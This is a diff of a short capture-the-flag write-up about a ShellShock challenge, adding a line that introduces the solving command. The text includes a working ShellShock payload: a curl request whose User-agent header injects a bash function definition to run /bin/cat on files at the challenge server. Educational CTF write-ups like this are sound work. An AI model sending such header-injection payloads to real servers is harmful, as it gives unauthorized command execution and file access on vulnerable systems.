@@ -17,7 +17,8 @@ In this challange you have to get the flag via ShellShock.
 
 Searching for *bash cgi vulns*, you can find a lot of ShellShock exploits. I found [this](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock) link very useful.
 
-By using this 
+By using this command you will get the flag:
+
 ```bash
 curl -H "User-agent: () { :;}; echo; /bin/cat ../j*" http://ctfp.ee:11111/unsafe.cgi
 ```
